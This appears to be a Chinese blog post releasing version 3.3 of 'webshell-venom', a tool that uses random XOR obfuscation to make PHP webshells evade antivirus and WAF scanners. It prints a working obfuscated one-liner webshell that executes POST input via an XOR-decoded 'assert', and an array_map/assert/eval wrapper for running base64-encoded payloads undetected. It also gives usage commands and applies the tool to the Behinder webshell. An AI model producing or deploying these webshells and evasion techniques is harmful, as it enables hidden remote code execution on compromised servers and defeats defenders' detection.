# webshell-venom 3.3 :利用随机异或免杀任意php文件


<meta name="referrer" content="no-referrer" />

## 前言

没想到这么快就800颗星了

这次算是一次比较重大的更新，具体情况请看下文。

## webshell-venom 3.3 更新日志

1. 代码结构优化，更清爽，方便自定义开发。
2. 减小shell体积。

1. 增加利用随机异或免杀任意php文件功能。

## 1. 结构优化

先上图吧

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435455-074170ad-2234-4ca3-b748-bb200b5716d3.png)

原来因为随手写的脚本，代码其实比较乱

这次整个重构了一遍，把随机的变量名随机字符串给标注了出来

shell结构一目了然，方便大家自己二次开发。

当然结构写的清爽也带来一些问题

比如说厂商写查杀正则的时候更方便了。。。

不过就像我一直强调的

**重要的从来不是脚本，而是思路**

只靠我一个人更新肯定是不行的

我在脚本里提供了很多公共函数，自己稍微修改一下就可以bypass。

## 2. 减小体积

这个自己生成一下就能看得到，不讲了。

```
<?php
class QCON{
    function __destruct(){
        $ARIK='cnP*lm'^"\x2\x1d\x23\x4f\x1e\x19";
        return @$ARIK("$this->DGBO");
    }
}
$qcon=new QCON();
@$qcon->DGBO=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>
```

## 3.对任意php文件免杀

这个是本文的重点，也是这次更新的重要部分，着重讲一下吧。

### 首先区分免杀跟加密的区别

- 加密就是让别人看不到源码
- 免杀是绕过waf的检测，使其无法识别为木马

- 单纯加密不一定可以免杀，但是免杀少不了加密

单纯加密的话百度搜一下php在线加密，一大堆网站

但是用过的都知道加密之后虽然谁都不认得了，但是D盾会报二级加密脚本

二级肯定不是咱们的目的，所以就要做0级的免杀。

### 任意文件免杀原理

首先大家要知道一点:

**随便一个被D盾杀的妈都不认的shell，base64或者hex等编码后waf都不认得**

所以思路就是：

先把原来的payload，给处理一遍

然后通过函数调用来解密并执行payload

### 如何调用

处理的话脚本中就是用的base64

那么如何调用呢

其实如果用eval的话很好写，随便改一下就免杀了

但是eval是一种语言结构不是函数，也就是不能像assert一样拆分就很难受

自己有点强迫症，shell中不能出现eval等关键字，不然会被最简单的字符串搜索查找到shell

所以就想到了assert

但是问题来了，assert不能执行多句

也就是说

```
assert(echo 1; echo 2; ); //差不多这个意思。。。
```

最后只回显一个1，也就是只执行第一句话。

但是所要免杀的php文件肯定不止一句话

所以一般assert就要配合eval使用

也就是`assert(eval(xxx;xxx;xxx;));`这种

还是有eval，那我还用个鸡儿的assert。。。

### 解决办法

研究了一下，发现利用array_map+assert+eval

加个数组处理就可以把eval给拆分掉了

```
array_map('u?ldOQ'^"\x14\x4c\x1f\x1\x3d\x25",array(('P/f}'^"\x35\x59\x7\x11")."(base64_decode('xxxxxxxx'));"));
```

上面的两个异或的字符串分别是assert跟eval

哈，然后放在类里调用一下就免杀了。

## 使用方法

```
python3 php-venom-3.3.py    #生成免杀一句话
python3 php-venom-3.3.py shell.php   # 对同目录下shell.php进行免杀处理，保存在shell.php.bypass.php
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435556-df46a525-c961-4926-80af-bb7b6500ae47.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435643-60c1e71f-88d8-40f2-bbfa-5876ad3b6619.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435736-5fc5eb65-b20e-4bec-8766-0f164daeff62.png)

## 免杀冰蝎

举个栗子，就免杀冰蝎吧。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435834-9d08cb0d-1f1e-48a7-a9f1-c9d618c3647b.png)

## 更多玩法

还可以免杀我上次发的自己二次开发的大马

大马地址：

https://github.com/yzddmr6/BestShell

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435960-19eb6d04-092e-4416-9db4-7cfdd5d90e8f.png)

200kb好像有点大。。。

想减小体积的话自己加个gzin压缩吧

免杀后的demo已经放到大马项目里了

## 不足之处

python的base64函数有点傻逼，不会自己检测源文件的编码方式php是世界上最好的语言

我在脚本里用了 chardet 模块来探测可能的编码

但是用了一下发现不能做到百分百正确识别

utf8的没问题，遇到其他编码就容易乱码

如果gbk乱码的话就自己手工base64一遍替换payload吧

## 项目地址

https://github.com/yzddmr6/webshell-venom
